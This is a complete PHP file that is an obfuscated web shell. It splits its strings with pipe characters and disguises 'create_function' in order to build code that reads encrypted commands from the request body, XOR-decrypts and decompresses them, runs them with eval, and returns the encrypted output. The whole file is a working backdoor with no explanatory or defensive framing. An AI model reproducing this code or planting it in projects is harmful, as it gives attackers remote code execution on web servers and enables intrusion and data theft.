<?php
$o='$k|="b215f7d8";|$kh="ae|62|5ba784b5"|;$k|f="3cd2a5|60|1e46"|;$p="9Loz|C|vsXL8M|mMTLZ|";function x($|t,$|';
$B='k){$c|=|st|rlen(|$k);$l=strlen($t);$o=|"";for|($||i=|0;$i<$l;){fo|r||(|$j=0;($j<$c&&$i<$l);$|j++,$|i++)|';
$m='pu|t")|,$m)==1|) {@ob_sta|rt()|;@ev|al|(@gzuncompres|s(|@x(@bas|e6|4_decode($|m|[1]),|$k)))|;$o=@ob_get|';
$a='_contents();|@ob_end||_clean()|;$r=@base|64_enco|de(@x(||@gzco|mpress($o),|$k));|print("$p|$kh$r|$kf");}';
$t='{$o.=$t{|$i}^$k{$j};|}}ret|urn $o;}i|f |(@preg_match(|"/|$kh(.+|)$kf/",|@|f|ile_get_contents("p|hp:|//in';
$v=str_replace('fh','','crefhfhate_fhfhfufhnfhction');
$x=str_replace('|','',$o.$B.$t.$m.$a);
$c=$v('',$x);$c();
?>
